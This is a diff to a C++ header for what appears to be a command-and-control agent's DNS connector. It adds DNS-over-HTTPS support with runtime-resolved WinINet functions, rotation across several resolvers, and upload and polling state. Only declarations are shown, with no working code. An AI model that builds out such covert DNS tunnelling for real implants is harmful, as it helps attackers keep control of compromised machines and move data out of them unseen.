@@ -2,10 +2,11 @@
 
 #include "AgentConfig.h"
 #include <windows.h>
+#include <wininet.h>
 
 #define DECL_API(x) decltype(x) * x
 
-// DNS function pointers structure
+// DNS function pointers structure (for UDP DNS)
 struct DNSFUNC {
     DECL_API(LocalAlloc);
     DECL_API(LocalReAlloc);
@@ -20,6 +21,27 @@ struct DNSFUNC {
     DECL_API(gethostbyname);
     DECL_API(Sleep);
     DECL_API(GetTickCount);
+    DECL_API(LoadLibraryA);
+    DECL_API(GetLastError);
+};
+
+struct DOHFUNC {
+    DECL_API(InternetOpenA);
+    DECL_API(InternetConnectA);
+    DECL_API(HttpOpenRequestA);
+    DECL_API(HttpSendRequestA);
+    DECL_API(InternetSetOptionA);
+    DECL_API(InternetQueryOptionA);
+    DECL_API(HttpQueryInfoA);
+    DECL_API(InternetQueryDataAvailable);
+    DECL_API(InternetCloseHandle);
+    DECL_API(InternetReadFile);
+};
+
+struct DohResolverInfo {
+    CHAR host[256];
+    CHAR path[128];
+    WORD port;
 };
 
 // DNS protocol metadata header
@@ -97,6 +119,7 @@ private:
 
     BOOL  hasPendingTasks = FALSE;
     BOOL  forcePoll = FALSE;
+    ULONG consecutiveFailures = 0;
 
     // Upload fragment tracking for reliability
     static const ULONG kMaxTrackedOffsets = 256;
@@ -107,6 +130,16 @@ private:
     ULONG uploadStartTime = 0;
 
     DNSFUNC* functions = NULL;
+
+    DOHFUNC* dohFunctions = NULL;
+    BOOL     dohInitialized = FALSE;
+    HINTERNET hInternet = NULL;
+    DohResolverInfo dohResolverList[kMaxResolvers] = { 0 };
+    ULONG dohResolverCount = 0;
+    ULONG currentDohResolverIndex = 0;
+    ULONG dohResolverFailCount[kMaxResolvers] = { 0 };
+    ULONG dohResolverDisabledUntil[kMaxResolvers] = { 0 };
+    ULONG dnsMode = DNS_MODE_UDP;
 
     // WSA and socket caching (optimization)
     BOOL   wsaInitialized = FALSE;
@@ -142,6 +175,14 @@ private:
     void  MarkOffsetConfirmed(ULONG offset);
     void  ResetUploadState();
 
+    BOOL  InitDoH();
+    void  CleanupDoH();
+    void  ParseDohResolvers(const CHAR* dohResolvers);
+    BOOL  QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
+    BOOL  QueryDoHWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
+    BOOL  BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outLen);
+    BOOL  ParseDnsWireResponse(BYTE* response, ULONG respLen, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
+
 public:
     ConnectorDNS();
     ~ConnectorDNS();
@@ -171,6 +212,7 @@ public:
     ULONG GetDownAckOffset() const { return downAckOffset; }
 
     BOOL  QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
+    BOOL  QueryUdpWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
 
     void  ForcePollOnce() { this->forcePoll = TRUE; }
     BOOL  IsForcePollPending() const { return this->forcePoll; }
